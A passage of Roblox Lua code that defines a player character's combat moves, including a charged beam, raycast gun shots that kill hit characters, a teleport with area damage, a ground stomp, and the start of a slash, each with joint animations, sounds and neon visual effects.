						Speed = 0
						local die = CreateSound(1566051529,RootPart,3,1)
						die.EmitterSize = 100
						swait(5)
						for i = 1,3 do
							for i = 0,1.5,0.1 do
								swait()
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(-5)),0.7/3)
								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(175),math.rad(-10),math.rad(10)) * rscp,1/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(-10),math.rad(-10),math.rad(-5)) * lscp,1/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							end
							Effect2({Time = 25,EffectType = "Box",Size = Vector3.new(),Size2 = Vector3.new(3,3,3),Transparency = 0,Transparency2 = 1,CFrame = cannon.Part.CFrame,MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1,0,0),SoundID = 642890855,SoundPitch = 0.45,SoundVolume = 6,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 50})
							Effect2({Time = 25,EffectType = "Box",Size = Vector3.new(),Size2 = Vector3.new(3,3,3),Transparency = 0,Transparency2 = 1,CFrame = cannon.Part.CFrame,MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 50})
							local skypos = cannon.Part.CFrame * CFrame.new(-400,0,0)
							local DISTANCE = (cannon.Part.Position - skypos.p).Magnitude
							local killbeam = CreatePart(3,Effects,"Neon",0,0,COLORSHIFT,"Kill Beam",Vector3.new(1,DISTANCE,1))
							killbeam.CFrame = CFrame.new(cannon.Part.Position,skypos.p) * CFrame.new(0,0,-DISTANCE/2) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(0))
							MakeForm(killbeam,"Cyl")
							coroutine.resume(coroutine.create(function()
								for i = 1,25 do
									swait()
									killbeam.Transparency = i/25
								end
								killbeam:Destroy()
							end))
							Lightning(cannon.Part.Position,skypos.p,15,3.5,Color3.new(0,0,1),25,0,1,0,true,55)
							Lightning(cannon.Part.Position,skypos.p,15,3.5,Color3.new(0,0,1),25,0,1,0,true,55)
							Lightning(cannon.Part.Position,skypos.p,15,3.5,Color3.new(0,0,1),25,0,1,0,true,55)
							Lightning(cannon.Part.Position,skypos.p,15,3.5,Color3.new(0,0,1),25,0,1,0,true,55)
							Lightning(cannon.Part.Position,skypos.p,15,3.5,Color3.new(0,0,1),25,0,1,0,true,55)
							for i = 0,2 do
								Effect2({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = cannon.Part.CFrame*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1,0,0),SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
								Effect2({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = cannon.Part.CFrame*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
							end
							Effect2({Time = 25,EffectType = "Box",Size = Vector3.new(),Size2 = Vector3.new(3,3,3),Transparency = 0,Transparency2 = 1,CFrame = skypos,MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1,0,0),SoundID = 192410089,SoundPitch = .55,SoundVolume = 8,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 50})
							Effect2({Time = 25,EffectType = "Box",Size = Vector3.new(),Size2 = Vector3.new(3,3,3),Transparency = 0,Transparency2 = 1,CFrame = skypos,MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 50})
							for i = 0,2 do
								Effect2({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = skypos*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = Color3.new(1,0,0),SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
								Effect2({Time = math.random(25,50),EffectType = "Round Slash",Size = Vector3.new(),Size2 = Vector3.new(.1,0,.1),Transparency = 0,Transparency2 = 1,CFrame = skypos*CFrame.Angles(math.rad(math.random(0,360)),math.rad(math.random(0,360)),math.rad(math.random(0,360))),MoveToPos = nil,RotationX = math.random(-1,1),RotationY = math.random(-1,1),RotationZ = math.random(-1,1),Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil,UseBoomerangMath = true,Boomerang = 0,SizeBoomerang = 15})
							end
							for i = 1,42 do
								swait()
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)),0.7/3)

								RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(135 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(25)) * RIGHTSHOULDERC0,0.7/3)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(25 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(-25 - 5 * math.cos(sine/25))) * LEFTSHOULDERC0,0.7/3)
								RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
								LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							end
						end
						for i = 1,15 do
							swait()
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)),0.7/3)

							RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(135 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(25)) * RIGHTSHOULDERC0,0.7/3)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(25 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(-25 - 5 * math.cos(sine/25))) * LEFTSHOULDERC0,0.7/3)
							RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
							LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
						end
						local BEAM = CreatePart(3,Effects,"Neon",0,0,Color3.new(0,0,1),"Beam",Vector3.new())
						local BEAM2 = CreatePart(3,Effects,"Neon",0,0,Color3.new(0,0,1),"Beam",Vector3.new())
						MakeForm(BEAM,"Ball")
						MakeForm(BEAM2,"Ball")
						BEAM.CFrame = CFrame.new(RootPart.Position)
						BEAM2.CFrame = CFrame.new(RootPart.Position)
						local boooom = CreateSound(415700134,RootPart,10,1,false)
						boooom.EmitterSize = 100
						for i=1,140 do
							swait()
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CFrame.new(0 + .5 * math.cos(sine/50),0,3 - .5 * math.sin(sine/50)),0.7/3)

							RightShoulder.C0 = Clerp(RightShoulder.C0,CFrame.new(1.5,0.5,0) * CFrame.Angles(math.rad(135 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(25)) * RIGHTSHOULDERC0,0.7/3)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0,CFrame.new(-1.5,0.5,0) * CFrame.Angles(math.rad(25 + 8.5 * math.cos(sine/50)),math.rad(0),math.rad(-25 - 5 * math.cos(sine/25))) * LEFTSHOULDERC0,0.7/3)
							RightHip.C0 = Clerp(RightHip.C0,CFrame.new(1,-0.5,-0.5) * CFrame.Angles(math.rad(-15 + 9 * math.cos(sine/74)),math.rad(80),math.rad(0)) * CFrame.Angles(math.rad(0 + 5 * math.cos(sine/37)),math.rad(0),math.rad(0)),0.7/3)
							LeftHip.C0 = Clerp(LeftHip.C0,CFrame.new(-1,-1,0) * CFrame.Angles(math.rad(-15 - 9 * math.cos(sine/54)),math.rad(-80),math.rad(0)) * CFrame.Angles(math.rad(0 - 5 * math.cos(sine/41)),math.rad(0),math.rad(0)),0.7/3)
							BEAM.Size = BEAM.Size + Vector3.new(0.7,8,0.7)
							BEAM2.Size = BEAM2.Size + Vector3.new(2,2,2)
							BEAM.Color = COLORSHIFT
							BEAM2.Color = COLORSHIFT
							BEAM.CFrame = CFrame.new(RootPart.Position)
							BEAM2.CFrame = CFrame.new(RootPart.Position)
							WACKYEFFECT({TIME = 5+i,EffectType = "Swirl",Size = BEAM2.Size*1.15,Size2 = Vector3.new(0,BEAM.Size.Y,0),Transparency = 0.8,Transparency2 = 1,CFrame = BEAM.CFrame * CFrame.Angles(math.rad(0),math.rad(i*5),math.rad(0)),MoveToPos = nil,RotationX = 0,RotationY = i/8,RotationZ = 0,Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil})
						end
						mdmg(RootPart.Position,BEAM2.Size.Y/2)
						Effect2({TIME = 75,EffectType = "Sphere",Size = BEAM.Size,Size2 = Vector3.new(0,BEAM.Size.Y,0),Transparency = 0,Transparency2 = 0,CFrame = BEAM.CFrame,MoveToPos = nil,RotationX = 0,RotationY = 0,RotationZ = 0,Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil})
						Effect2({TIME = 75,EffectType = "Sphere",Size = BEAM2.Size,Size2 = Vector3.new(0,0,0),Transparency = 0,Transparency2 = 0.6,CFrame = BEAM2.CFrame,MoveToPos = nil,RotationX = 0,RotationY = 0,RotationZ = 0,Material = "Neon",Color = COLORSHIFT,SoundID = nil,SoundPitch = nil,SoundVolume = nil})
						for i,v in pairs(Effects:GetChildren()) do
							v.Color = COLORSHIFT
							v:GetPropertyChangedSignal("Color"):Connect(function()
								v.Color = COLORSHIFT
							end)
						end
						BEAM2:Destroy()
						BEAM:Destroy()
						ATTACK = false
						Speed = 30
					end
					function Shot1()
						local Hole = Gunclone:FindFirstChild("Hole")
						ATTACK = true
						Rooted = false
						for i=0, 0.01, 0.1 / Animation_Speed do
							Swait()
							turnto(Mouse.Hit.p)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
						end
						repeat
							for i=0, 0.01, 0.1 / Animation_Speed do
								Swait()
								turnto(Mouse.Hit.p)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							end
							local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
							SpawnTrail(Hole.Position,POS)
							CreateSound(904440937, Character, 10, 1, false)
							if HIT ~= nil then
								if HIT.Parent:FindFirstChildOfClass("Humanoid") then
									Kill(HIT.Parent)
								end
							end
							for i=0, 0.01, 0.1 / Animation_Speed do
								Swait()
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.25 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(15), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							end
						until KEYHOLD == false
						ATTACK = false
						Rooted = false
					end
					function Shot2()
						local Hole = Gunclone:FindFirstChild("Hole")
						ATTACK = true
						Rooted = false
						for i=0, 0.01, 0.1 / Animation_Speed do
							Swait()
							turnto(Mouse.Hit.p)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
						end
						repeat
							for i=0, 0.01, 0.1 / Animation_Speed do
								Swait()
								turnto(Mouse.Hit.p)
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.5 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							end
							local HIT,POS = CastProperRay(Hole.Position, Mouse.Hit.p, 1000, Character)
							SpawnTrail(Hole.Position,POS)
							CreateSound(904440937, Character, 10, 1, false)
							if HIT ~= nil then
								if HIT.Parent.ClassName == "Model" then
									Kill(HIT.Parent)
								end
							end
							for i=0, 0.01, 0.1 / Animation_Speed do
								Swait()
								RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(90)), 0.5 / Animation_Speed)
								Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(-90)), 0.25 / Animation_Speed)
								RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(90), RAD(15), RAD(90)) * RIGHTSHOULDERC0, 0.5 / Animation_Speed)
								LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.6, 0) * ANGLES(RAD(-45), RAD(0), RAD(45)) * LEFTSHOULDERC0, 0.5 / Animation_Speed)
								RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
								LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-8), RAD(0), RAD(0)), 0.5 / Animation_Speed)
							end
						until KEYHOLD == false
						ATTACK = false
						Rooted = false
					end

					function Warp()
						local POS = Mouse.Hit.p+VT(0,4,0)
						local ORI = RootPart.Orientation
						RootPart.CFrame = CF(POS)
						RootPart.Orientation = ORI
						RootJoint.Parent = RootPart    
						CreateSound("424195979",RootPart,7,2,false)
						ShakeCam(1,25)
						for i = 1,4.5,.15 do 
							SpecialSphere(VT(2,10,2)/6,35,CF(POS,RootPart.Position)*ANGLES(RAD(MATHR(-360,360)),RAD(MATHR(-360,360)),RAD(MATHR(-360,360)))*CF(0,MATHR(4,8),0),Color3.new(0,0,0),VT(0,0,0))	
							SpecialSphere(VT(2,10,2)/6,35,CF(POS,RootPart.Position)*ANGLES(RAD(MATHR(-360,360)),RAD(MATHR(-360,360)),RAD(MATHR(-360,360)))*CF(0,MATHR(4,8),0),Color3.new(0,0,0),VT(0,0,0))	
							WACKYEFFECT({Time=20,EffectType = "Sphere", Size = VT(4*i,65*(1-i/4.5),4*i)*SCALE, Size2 = VT(5*i,0,5*i)*SCALE, Transparency = 0, Transparency2 = 1, CFrame = CF(POS)*ANGLES(0,360*math.rad(i),0), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							WACKYEFFECT({Time=20,EffectType = "Sphere", Size = VT(4*i,65*(1-i/4.5),4*i)*SCALE, Size2 = VT(5*i,0,5*i)*SCALE, Transparency = 0, Transparency2 = 1, CFrame = CF(POS)*ANGLES(0,360*math.rad(i),0), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							ApplyAoE(POS,20)
						end
					end

					function Stomp()
						ATTACK = true
						Rooted = false
						PLAYANIMS = false
						Speed = 5
						for i=0, 1, 0.1 / Animation_Speed do
							Swait()
							RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 + 0.1 * COS(SINE / 12)) * ANGLES(RAD(5), RAD(0), RAD(0)), 2 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0) * ANGLES(RAD(-25 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 2 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(25)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-25)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1*SIZE, -0.4*SIZE, -0.6*SIZE) * ANGLES(RAD(1), RAD(90), RAD(0)) * ANGLES(RAD(-1 * SIN(SINE / 6)), RAD(0), RAD(0)), 1 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.1 * COS(SINE /12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-4), RAD(0), RAD(0)), 0.8 / Animation_Speed)
						end
						CreateSound(3923230963,Torso,10,1,false)
						WACKYEFFECT({Time = 25, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(50,10,50)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-3,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						WACKYEFFECT({Time = 25, EffectType = "Block", Size = VT(0,0,0), Size2 = VT(50,50,50)*MATHR(1000/1000,1750/1000), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-3,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0.01,1), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-3,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0.01,1), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-3,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						WACKYEFFECT({Time = 25, EffectType = "Slash", Size = VT(0,0,0), Size2 = VT(1,0.01,1), Transparency = 0, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,-3,0)*ANGLES(RAD(MATHR(-5,5)),RAD(MATHR(-360,360)),RAD(MATHR(-5,5))), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-100/1000,100/1000), RotationZ = 0, Material = "Neon", Color = C3(0,0,0), SoundID = 3923230963, SoundPitch = MATHR(1,1.1), SoundVolume = 10})
						ApplyAoE(RootPart.Position,25)
						ShakeCam(3,25)
						for i=0, 1, 0.1 / Animation_Speed do
							Swait()
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 3 / Animation_Speed)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(-180), RAD(-5)) * LEFTSHOULDERC0, 0.8 / Animation_Speed)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.1 * COS(SINE /12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.8 / Animation_Speed)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.8 / Animation_Speed)
							RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.1 * COS(SINE /12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(-4), RAD(0), RAD(0)), 0.8 / Animation_Speed)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.1 * COS(SINE /12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(-4), RAD(0), RAD(0)), 0.8 / Animation_Speed)
						end
						Speed = 15
						PLAYANIMS = true
						ATTACK = false
						Rooted = false
						Humanoid.CameraOffset = VT(0,0,0)
					end

					function Slash()
						ATTACK = true
						Rooted = true
						PLAYANIMS = false
						local STOPPP = false
						MagicSphere(VT(0,0,0),15,RootPart.CFrame,"Really black",VT(2,2,2))
						coroutine.wrap(function()
							while wait() do
								WACKYEFFECT({Time = 15, EffectType = "Crystal", Size = VT(1,5,1), Size2 = VT(1,25,1), Transparency = 0, Transparency2 = 1, CFrame = RightArm.CFrame*CF(0,0,0)*ANGLES(RAD(MATHR(0,360)),RAD(MATHR(0,360)),RAD(MATHR(0,360))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Glass", Color = BRICKC"Really red".Color, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
								if STOPPP == true then
									break
								end
							end
						end)()
						for i=0, 1, 0.1 / Animation_Speed do
							Swait()
							CreateRing(VT(0,0,0),false,0,5,CF(RootPart.Position-VT(0,3,0))*ANGLES(RAD(90),RAD(0),RAD(0)),"Really black",VT(1,1,0))
							turnto(Mouse.Hit.p)
							RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0*SIZE, 0*SIZE, -0.5*SIZE) * ANGLES(RAD(0), RAD(0), RAD(-75)), 0.5 / Animation_Speed)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0*SIZE, 0*SIZE, 0*SIZE + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(75)), 0.5 / Animation_Speed)
